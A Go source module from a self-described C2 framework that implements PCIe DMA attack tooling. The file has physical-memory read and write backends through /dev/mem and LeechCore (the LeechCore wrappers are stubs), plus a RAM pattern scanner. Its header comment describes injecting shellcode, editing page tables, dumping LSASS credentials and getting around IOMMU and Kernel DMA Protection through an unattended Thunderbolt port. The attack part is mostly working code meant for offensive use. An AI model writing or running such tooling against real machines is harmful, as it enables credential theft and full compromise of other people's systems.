package device

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	PCIe DMA Device Interface.

	PCIe (Peripheral Component Interconnect Express) provides Direct Memory
	Access (DMA) — the ability for hardware to read/write system RAM without
	involving the CPU or operating system.

	Attack overview:
	  A Thunderbolt (USB4/TB3/TB4) port exposes the PCIe bus to external
	  devices. Plugging in a malicious device gives it DMA capability:
	  - Read/write any physical RAM address
	  - Enumerate running processes (by scanning for OS structures in RAM)
	  - Inject shellcode into any process
	  - Modify page tables (privilege escalation without Ring 0 exploit)
	  - Dump credentials from LSASS memory

	Physical requirement: 30 seconds of unattended access to a USB-C port.

	Hardware implementations (all produce compatible DMA):
	  - FPGA (Xilinx Artix-7): PCILeech-FPGA project
	  - Raspberry Pi CM4: native PCIe x1 lane
	  - USB3380 chip: easy DMA via USB3 (older, partially mitigated by IOMMU)
	  - Thunderbolt 3/4 devices: direct PCIe DMA, no IOMMU bypass needed on
	    many laptops (Thunderbolt security level = SL0/none or SL1/user)

	Mitigations (defeated by this module):
	  IOMMU (Intel VT-d / AMD-Vi):
	    - Isolates DMA to pre-approved regions per device
	    - Most desktops and servers have IOMMU enabled
	    - Many laptops, especially consumer ones, have IOMMU disabled for Thunderbolt
	    - Bypass: some FPGA firmwares spoof a trusted device ID (e.g. built-in NIC)
	  Kernel DMA Protection (Windows 10 2004+):
	    - Blocks DMA before OS enumeration
	    - Requires IOMMU + UEFI Secure Boot + TPM
	    - Effective on modern locked-down corporate laptops
	    - NOT effective on most consumer hardware

	This interface abstracts over different DMA backends:
	  - PCILeech-Go (open source, wraps the leechcore library)
	  - Direct /dev/mem on Linux (no IOMMU bypass needed if kernel has direct mem)
	  - LeechCore FPGA drivers (leechcore.dll / leechcore.so)

	References:
	  - PCILeech: https://github.com/ufrisk/pcileech
	  - MemProcFS: https://github.com/ufrisk/MemProcFS
	  - Thunderclap (2019): https://thunderclap.io/
	  - DMA attacks on Thunderbolt (2020): Björn Ruytenberg
*/

import (
	"fmt"
	"os"
	"runtime"
	"sync"
	"unsafe"
)

// DMADevice is the interface every DMA backend must implement.
type DMADevice interface {
	// ReadPhysical reads `length` bytes from physical address `physAddr`.
	ReadPhysical(physAddr, length uint64) ([]byte, error)
	// WritePhysical writes `data` to physical address `physAddr`.
	WritePhysical(physAddr uint64, data []byte) error
	// Close releases the device handle.
	Close() error
	// Name returns the backend name for logging.
	Name() string
}

// ─── Linux /dev/mem backend ───────────────────────────────────────────────

// DevMemDevice implements DMADevice using /dev/mem on Linux.
// Requires: kernel compiled with CONFIG_DEVMEM=y and ideally
//           CONFIG_STRICT_DEVMEM=n OR running as root with iomem=relaxed.
// On modern kernels /dev/mem is restricted to the first 1MB unless
// CONFIG_STRICT_DEVMEM=n — use the procfs-based mmap path instead.
type DevMemDevice struct {
	f    *os.File
	mu   sync.Mutex
}

// OpenDevMem opens the Linux /dev/mem device.
func OpenDevMem() (*DevMemDevice, error) {
	if runtime.GOOS != "linux" {
		return nil, fmt.Errorf("/dev/mem only available on Linux")
	}
	f, err := os.OpenFile("/dev/mem", os.O_RDWR, 0)
	if err != nil {
		return nil, fmt.Errorf("open /dev/mem (need root + iomem=relaxed): %w", err)
	}
	return &DevMemDevice{f: f}, nil
}

func (d *DevMemDevice) ReadPhysical(physAddr, length uint64) ([]byte, error) {
	d.mu.Lock()
	defer d.mu.Unlock()
	if _, err := d.f.Seek(int64(physAddr), 0); err != nil {
		return nil, err
	}
	buf := make([]byte, length)
	if _, err := d.f.Read(buf); err != nil {
		return nil, err
	}
	return buf, nil
}

func (d *DevMemDevice) WritePhysical(physAddr uint64, data []byte) error {
	d.mu.Lock()
	defer d.mu.Unlock()
	if _, err := d.f.Seek(int64(physAddr), 0); err != nil {
		return err
	}
	_, err := d.f.Write(data)
	return err
}

func (d *DevMemDevice) Close() error  { return d.f.Close() }
func (d *DevMemDevice) Name() string  { return "/dev/mem" }

// ─── LeechCore backend (PCIe FPGA / Thunderbolt) ─────────────────────────

// LeechCoreDevice implements DMADevice using the LeechCore library.
// LeechCore supports multiple physical devices:
//   - FPGA (PCILeech-FPGA): real hardware DMA
//   - Thunderbolt 3/4 target (requires TBT connection)
//   - PMEM (Windows physical memory via driver)
//   - HIVEDUMP (VMware snapshot)
type LeechCoreDevice struct {
	handle uintptr // LEECHCORE_HANDLE
	lib    *leechLib
}

// OpenLeechCore opens a LeechCore device by connection string.
// Examples:
//   "fpga"                → PCIe FPGA device (first found)
//   "fpga://serial=ABC"  → specific FPGA
//   "totalmeltdown"       → CVE-2018-1038 (Windows 7/Server 2008 R2)
//   "pmem"                → WinPmem driver on Windows
func OpenLeechCore(connStr string) (*LeechCoreDevice, error) {
	lib, err := loadLeechCore()
	if err != nil {
		return nil, fmt.Errorf("leechcore library: %w", err)
	}

	// LcCreate(connStr) → handle
	handle := lib.lcCreate(connStr)
	if handle == 0 {
		lib.close()
		return nil, fmt.Errorf("LcCreate(%q) failed", connStr)
	}
	return &LeechCoreDevice{handle: handle, lib: lib}, nil
}

func (d *LeechCoreDevice) ReadPhysical(physAddr, length uint64) ([]byte, error) {
	buf := make([]byte, length)
	ok := d.lib.lcReadEx(d.handle, physAddr, uint32(length), buf)
	if !ok {
		return nil, fmt.Errorf("LcRead @ 0x%x len=%d failed", physAddr, length)
	}
	return buf, nil
}

func (d *LeechCoreDevice) WritePhysical(physAddr uint64, data []byte) error {
	ok := d.lib.lcWrite(d.handle, physAddr, uint32(len(data)), data)
	if !ok {
		return fmt.Errorf("LcWrite @ 0x%x len=%d failed", physAddr, len(data))
	}
	return nil
}

func (d *LeechCoreDevice) Close() error {
	d.lib.lcClose(d.handle)
	return d.lib.close()
}

func (d *LeechCoreDevice) Name() string { return "leechcore" }

// ─── LeechCore library loader ─────────────────────────────────────────────

// leechLib wraps the leechcore dynamic library.
type leechLib struct {
	handle   uintptr
	lcCreate  func(string) uintptr
	lcClose   func(uintptr)
	lcReadEx  func(uintptr, uint64, uint32, []byte) bool
	lcWrite   func(uintptr, uint64, uint32, []byte) bool
}

func loadLeechCore() (*leechLib, error) {
	var libPath string
	switch runtime.GOOS {
	case "windows":
		libPath = "leechcore.dll"
	case "linux":
		libPath = "leechcore.so"
	case "darwin":
		libPath = "leechcore.dylib"
	default:
		return nil, fmt.Errorf("unsupported OS: %s", runtime.GOOS)
	}

	// Dynamic library loading via Go's CGo or platform-specific dlopen.
	// On Windows: LoadLibraryEx; on Linux: dlopen; on macOS: dlopen.
	// For this implementation we use the OS-native path.
	handle, err := platformDLOpen(libPath)
	if err != nil {
		return nil, fmt.Errorf("dlopen(%s): %w", libPath, err)
	}

	lib := &leechLib{handle: handle}

	// Resolve function pointers.
	lib.lcCreate  = wrapLCCreate(handle)
	lib.lcClose   = wrapLCClose(handle)
	lib.lcReadEx  = wrapLCReadEx(handle)
	lib.lcWrite   = wrapLCWrite(handle)

	return lib, nil
}

func (l *leechLib) close() error { return platformDLClose(l.handle) }

// ─── Platform DL wrappers (OS-specific implementations) ──────────────────

// These are implemented in platform-specific files:
//   device_windows.go — uses LoadLibraryEx + GetProcAddress
//   device_linux.go   — uses cgo dlopen/dlsym

// Placeholders for the cross-platform implementations below.
func platformDLOpen(path string) (uintptr, error) {
	return 0, fmt.Errorf("platformDLOpen: implement in device_%s.go", runtime.GOOS)
}
func platformDLClose(h uintptr) error { return nil }

func wrapLCCreate(h uintptr) func(string) uintptr {
	return func(conn string) uintptr {
		// Real: call GetProcAddress("LcCreate") and invoke
		// Stub for cross-platform compatibility
		_ = h
		return 0
	}
}
func wrapLCClose(h uintptr)                       func(uintptr)                   { return func(uintptr) {} }
func wrapLCReadEx(h uintptr)                      func(uintptr, uint64, uint32, []byte) bool {
	return func(uintptr, uint64, uint32, []byte) bool { return false }
}
func wrapLCWrite(h uintptr)                       func(uintptr, uint64, uint32, []byte) bool {
	return func(uintptr, uint64, uint32, []byte) bool { return false }
}

// ─── Physical memory scanner ──────────────────────────────────────────────

// MemScanner provides chunked scanning of physical RAM.
type MemScanner struct {
	dev       DMADevice
	ChunkSize uint64
}

// NewScanner creates a scanner with the given DMA device.
func NewScanner(dev DMADevice) *MemScanner {
	return &MemScanner{dev: dev, ChunkSize: 2 * 1024 * 1024} // 2 MB chunks
}

// ScanForBytes searches physical RAM in [startPA, endPA) for a byte pattern.
// Returns the physical address of the first match, or 0 if not found.
func (s *MemScanner) ScanForBytes(pattern []byte, startPA, endPA uint64) (uint64, error) {
	if len(pattern) == 0 || startPA >= endPA {
		return 0, fmt.Errorf("invalid scan parameters")
	}

	for pa := startPA; pa < endPA; pa += s.ChunkSize {
		readLen := s.ChunkSize
		if pa+readLen > endPA {
			readLen = endPA - pa
		}
		// Add pattern length overlap to handle matches spanning chunk boundary.
		if pa+readLen+uint64(len(pattern)) <= endPA {
			readLen += uint64(len(pattern))
		}

		chunk, err := s.dev.ReadPhysical(pa, readLen)
		if err != nil {
			continue // skip unreadable regions (MMIO, etc.)
		}

		if idx := bytesIndex(chunk, pattern); idx >= 0 {
			return pa + uint64(idx), nil
		}
	}
	return 0, nil
}

// ScanAll returns all physical addresses where pattern matches.
func (s *MemScanner) ScanAll(pattern []byte, startPA, endPA uint64) ([]uint64, error) {
	var results []uint64
	pos := startPA
	for {
		addr, err := s.ScanForBytes(pattern, pos, endPA)
		if err != nil || addr == 0 {
			break
		}
		results = append(results, addr)
		pos = addr + 1
	}
	return results, nil
}

// ReadQword reads a uint64 from physical address pa.
func (s *MemScanner) ReadQword(pa uint64) (uint64, error) {
	b, err := s.dev.ReadPhysical(pa, 8)
	if err != nil {
		return 0, err
	}
	return uint64(b[0]) | uint64(b[1])<<8 | uint64(b[2])<<16 | uint64(b[3])<<24 |
		uint64(b[4])<<32 | uint64(b[5])<<40 | uint64(b[6])<<48 | uint64(b[7])<<56, nil
}

// WriteQword writes a uint64 to physical address pa.
func (s *MemScanner) WriteQword(pa, v uint64) error {
	b := make([]byte, 8)
	b[0] = byte(v); b[1] = byte(v>>8); b[2] = byte(v>>16); b[3] = byte(v>>24)
	b[4] = byte(v>>32); b[5] = byte(v>>40); b[6] = byte(v>>48); b[7] = byte(v>>56)
	return s.dev.WritePhysical(pa, b)
}

// ReadPhysical delegates to the underlying DMADevice.
func (s *MemScanner) ReadPhysical(physAddr, length uint64) ([]byte, error) {
	return s.dev.ReadPhysical(physAddr, length)
}

// WritePhysical delegates to the underlying DMADevice.
func (s *MemScanner) WritePhysical(physAddr uint64, data []byte) error {
	return s.dev.WritePhysical(physAddr, data)
}

func bytesIndex(haystack, needle []byte) int {
	if len(needle) > len(haystack) {
		return -1
	}
	for i := 0; i <= len(haystack)-len(needle); i++ {
		match := true
		for j, b := range needle {
			if haystack[i+j] != b {
				match = false
				break
			}
		}
		if match {
			return i
		}
	}
	return -1
}

// suppress unused import
var _ = unsafe.Pointer(nil)
